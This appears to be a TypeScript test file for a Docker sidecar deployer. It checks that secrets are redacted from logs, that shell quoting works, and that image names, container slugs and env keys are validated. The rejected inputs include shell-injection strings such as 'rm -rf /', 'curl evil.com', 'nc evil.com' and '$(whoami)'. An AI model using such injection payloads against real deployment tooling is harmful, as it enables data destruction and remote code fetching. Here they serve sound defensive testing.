/**
 * sidecar-deployer-utils.test.ts — 锁住 SidecarDeployer 的纯逻辑工具：
 *
 *   1. redactCmd —— 脱敏日志中的 -e KEY=VAL（key 含 SECRET/TOKEN/KEY/PASS/PWD 时
 *      VAL 必须变 ***），其他 env 原样保留
 *   2. shellQuote —— 单引号包裹 + 单引号自身转义，防注入
 *   3. renderEnvFlags —— 字典转 docker `-e KEY='VAL'` 串
 *
 * 这三个函数是部署日志安全 / 命令安全的最小护栏；任何后续优化（合并 docker
 * compose 路径 / 加更多敏感后缀）都先在这里加 case。
 */

import { describe, expect, it } from 'vitest';

import {
  isSafeContainerSlug,
  isSafeDockerImage,
  isSafeEnvKey,
  redactCmd,
  renderEnvFlags,
  shellQuote,
} from '../../../src/services/sidecar/sidecar-deployer.js';

describe('redactCmd', () => {
  it('屏蔽含 SECRET 后缀的 env 值', () => {
    const cmd = "docker run -e MY_SECRET=hunter2 -e PUBLIC=open prdagent/sidecar:dev";
    const out = redactCmd(cmd);
    expect(out).toContain('MY_SECRET=***');
    expect(out).toContain('PUBLIC=open'); // 不脱敏正常 env
  });

  it('屏蔽含 TOKEN / KEY / PASS / PWD 后缀的 env', () => {
    expect(redactCmd("docker run -e SIDECAR_TOKEN='abc'")).toContain("SIDECAR_TOKEN=***");
    expect(redactCmd('docker run -e ANTHROPIC_API_KEY=sk-xxx')).toContain('ANTHROPIC_API_KEY=***');
    expect(redactCmd('docker run -e SSH_PASSPHRASE=topsecret')).toContain('SSH_PASSPHRASE=***');
    expect(redactCmd("docker run -e DB_PWD='p@ss'")).toContain('DB_PWD=***');
  });

  it('普通命令原样返回', () => {
    const cmd = 'docker pull prdagent/sidecar:v0.2.1';
    expect(redactCmd(cmd)).toBe(cmd);
  });

  it('多个敏感 env 同时屏蔽', () => {
    const cmd = 'docker run -e A_TOKEN=t1 -e B_KEY=k1 -e C_PASS=p1 image';
    const out = redactCmd(cmd);
    expect(out).toContain('A_TOKEN=***');
    expect(out).toContain('B_KEY=***');
    expect(out).toContain('C_PASS=***');
    expect(out).not.toContain('t1');
    expect(out).not.toContain('k1');
    expect(out).not.toContain('p1');
  });
});

describe('shellQuote', () => {
  it('普通字符串包单引号', () => {
    expect(shellQuote('hello')).toBe("'hello'");
  });

  it('值含单引号时正确转义', () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });

  it('空串', () => {
    expect(shellQuote('')).toBe("''");
  });

  it('防注入：含 ; rm -rf 不会逃逸', () => {
    const malicious = "x'; rm -rf /;'";
    const out = shellQuote(malicious);
    // 出现一对外层引号 + 转义；shell 解析后值被当成字面量
    expect(out.startsWith("'")).toBe(true);
    expect(out.endsWith("'")).toBe(true);
    expect(out).toContain("'\\''");
  });

  it('非字符串入参直接抛 TypeError（PR #529 Bugbot MEDIUM defense-in-depth）', () => {
    // @ts-expect-error 故意传非字符串
    expect(() => shellQuote(null)).toThrow(/expected string.*null/);
    // @ts-expect-error 故意传非字符串
    expect(() => shellQuote(123)).toThrow(/expected string.*number/);
    // @ts-expect-error 故意传非字符串
    expect(() => shellQuote(undefined)).toThrow(/expected string.*undefined/);
    // @ts-expect-error 故意传非字符串
    expect(() => shellQuote({ a: 1 })).toThrow(/expected string.*object/);
  });
});

describe('isSafeDockerImage (PR #529 Bugbot HIGH defense)', () => {
  it('合法 image 通过', () => {
    expect(isSafeDockerImage('alpine')).toBe(true);
    expect(isSafeDockerImage('alpine:3.20')).toBe(true);
    expect(isSafeDockerImage('library/alpine:latest')).toBe(true);
    expect(isSafeDockerImage('ghcr.io/owner/repo:v1.2.3')).toBe(true);
    expect(isSafeDockerImage('prdagent/claude-sidecar:dev')).toBe(true);
    expect(isSafeDockerImage('foo@sha256:abc123def')).toBe(true);
    expect(isSafeDockerImage('registry-1.docker.io/library/alpine:3.20')).toBe(true);
  });

  it('shell 元字符全部拒', () => {
    expect(isSafeDockerImage('alpine; rm -rf /')).toBe(false);
    expect(isSafeDockerImage('alpine;curl evil.com')).toBe(false);
    expect(isSafeDockerImage('alpine | nc evil.com')).toBe(false);
    expect(isSafeDockerImage('alpine && rm -rf /')).toBe(false);
    expect(isSafeDockerImage('alpine`whoami`')).toBe(false);
    expect(isSafeDockerImage('alpine$(whoami)')).toBe(false);
    expect(isSafeDockerImage('alpine > /etc/passwd')).toBe(false);
    expect(isSafeDockerImage("alpine 'foo'")).toBe(false);
    expect(isSafeDockerImage('alpine\nls')).toBe(false);
  });

  it('空 / 非字符串 / 超长拒', () => {
    expect(isSafeDockerImage('')).toBe(false);
    expect(isSafeDockerImage('a'.repeat(257))).toBe(false);
    // @ts-expect-error 故意传非字符串
    expect(isSafeDockerImage(undefined)).toBe(false);
    // @ts-expect-error 故意传非字符串
    expect(isSafeDockerImage(null)).toBe(false);
    // @ts-expect-error 故意传非字符串
    expect(isSafeDockerImage(123)).toBe(false);
  });
});

describe('isSafeContainerSlug', () => {
  it('合法 slug 通过', () => {
    expect(isSafeContainerSlug('sidecar')).toBe(true);
    expect(isSafeContainerSlug('sidecar-prod-1')).toBe(true);
    expect(isSafeContainerSlug('a1b2c3')).toBe(true);
  });

  it('大写 / 空格 / 特殊字符拒', () => {
    expect(isSafeContainerSlug('Sidecar')).toBe(false);
    expect(isSafeContainerSlug('side car')).toBe(false);
    expect(isSafeContainerSlug('sidecar;rm')).toBe(false);
    expect(isSafeContainerSlug('')).toBe(false);
    expect(isSafeContainerSlug('a'.repeat(65))).toBe(false);
  });

  it('首尾 - 与连续 -- 拒（PR #529 Bugbot MEDIUM 美观 + 防纯破折号）', () => {
    expect(isSafeContainerSlug('-sidecar')).toBe(false);
    expect(isSafeContainerSlug('sidecar-')).toBe(false);
    expect(isSafeContainerSlug('-')).toBe(false);
    expect(isSafeContainerSlug('---')).toBe(false);
    expect(isSafeContainerSlug('side--car')).toBe(false);
  });
});

describe('isSafeEnvKey (PR #529 Bugbot MEDIUM)', () => {
  it('合法 POSIX env name 通过', () => {
    expect(isSafeEnvKey('FOO')).toBe(true);
    expect(isSafeEnvKey('FOO_BAR')).toBe(true);
    expect(isSafeEnvKey('_INTERNAL')).toBe(true);
    expect(isSafeEnvKey('Foo123')).toBe(true);
  });

  it('含 shell 元字符 / 空格 / 等号 拒', () => {
    expect(isSafeEnvKey('FOO BAR')).toBe(false);
    expect(isSafeEnvKey('FOO=BAR')).toBe(false);
    expect(isSafeEnvKey('FOO;rm')).toBe(false);
    expect(isSafeEnvKey('$(whoami)')).toBe(false);
    expect(isSafeEnvKey('FOO\nBAR')).toBe(false);
  });

  it('首字符是数字拒（POSIX 不允许）', () => {
    expect(isSafeEnvKey('1FOO')).toBe(false);
    expect(isSafeEnvKey('123')).toBe(false);
  });

  it('空 / 超长 / 非字符串拒', () => {
    expect(isSafeEnvKey('')).toBe(false);
    expect(isSafeEnvKey('A'.repeat(129))).toBe(false);
    // @ts-expect-error 故意传非字符串
    expect(isSafeEnvKey(undefined)).toBe(false);
    // @ts-expect-error 故意传非字符串
    expect(isSafeEnvKey(null)).toBe(false);
  });
});

describe('renderEnvFlags', () => {
  it('空 / undefined → 空串', () => {
    expect(renderEnvFlags(undefined)).toBe('');
    expect(renderEnvFlags({})).toBe('');
  });

  it('单字段', () => {
    expect(renderEnvFlags({ FOO: 'bar' })).toBe("-e 'FOO'='bar'");
  });

  it('多字段（顺序按 Object.entries 自然顺序）', () => {
    const out = renderEnvFlags({ FOO: '1', BAR: '2' });
    expect(out).toContain("-e 'FOO'='1'");
    expect(out).toContain("-e 'BAR'='2'");
  });

  it('值含单引号 + 空格 / 特殊字符', () => {
    const out = renderEnvFlags({ MSG: "it's a test", EMPTY: '' });
    expect(out).toContain("-e 'MSG'='it'\\''s a test'");
    expect(out).toContain("-e 'EMPTY'=''");
  });

  it('非法 key 直接抛错（PR #529 Bugbot MEDIUM defense-in-depth）', () => {
    expect(() => renderEnvFlags({ 'FOO BAR': 'v' })).toThrow(/unsafe env key/);
    expect(() => renderEnvFlags({ '$(whoami)': 'v' })).toThrow(/unsafe env key/);
    expect(() => renderEnvFlags({ '1FOO': 'v' })).toThrow(/unsafe env key/);
  });
});
